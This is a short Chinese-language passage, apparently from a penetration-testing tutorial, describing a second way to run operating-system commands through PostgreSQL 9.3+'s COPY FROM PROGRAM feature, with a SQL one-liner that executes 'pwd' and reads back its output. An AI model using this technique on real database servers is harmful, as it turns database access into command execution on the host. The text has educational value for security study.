第二种方式执行命令，这种方式是需要要求版本大于9.3以上的

由于9.3增加一个“COPY TO/FROM PROGRAM”功能。这个功能就是允许数据库的超级用户以及pg\_read\_server\_files组中的任何用户执行操作系统命令。

 

*

*   
*

*

```
DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'pwd'; SELECT * FROM cmd_exec;
```
